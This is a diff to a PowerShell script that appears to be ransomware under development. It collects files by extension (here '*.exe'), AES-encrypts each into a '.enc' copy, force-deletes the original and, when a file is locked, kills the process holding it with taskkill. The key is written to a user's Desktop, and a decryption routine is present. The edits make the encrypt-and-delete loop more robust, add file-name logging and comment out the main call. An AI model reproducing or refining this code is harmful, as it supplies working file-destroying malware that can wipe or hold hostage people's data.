@@ -64,15 +64,18 @@ function Get-All-Files($exts){
 }
 
 function Not-Too-Big($file, $key){
-    $content = Get-Content -literalPath $file 
-    $encryptedcontent = Encrypt-String $key $content 
-    Set-Content -Path $file'.enc' -Value $encryptedcontent
     try{
+        $content = Get-Content -literalPath $file 
+        $encryptedcontent = Encrypt-String $key $content
+        Set-Content -Path $file'.enc' -Value $encryptedcontent
         Remove-Item –path $file -force
     }
     catch{
         try{
+            $content = Get-Content -literalPath $file 
+            $encryptedcontent = Encrypt-String $key $content
             Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
+            Set-Content -Path $file'.enc' -Value $encryptedcontent
             Remove-Item –path $file -force
             }
             catch{}
@@ -97,7 +100,7 @@ function Encrypt-All($exts, $key){
     $files = Get-All-Files $exts
     $erroractionPreference="stop"
     Foreach ($file in $files){
-
+        $file
         $toobig = ((Get-Item $file).length/1MB) -lt 30
 
         If ($toobig){
@@ -126,6 +129,6 @@ function Decrypt-All($key){
 $key = Create-AesKey
 Set-Content -Path 'C:\Users\ydgaygui\Desktop\key.aes' -Value $key
 $ext = '*.exe'
-Encrypt-All $ext $key
+#Encrypt-All $ext $key
 #$key = Get-Content -Path 'C:\Users\ydgaygui\Desktop\key.aes'
 #Decrypt-All $key
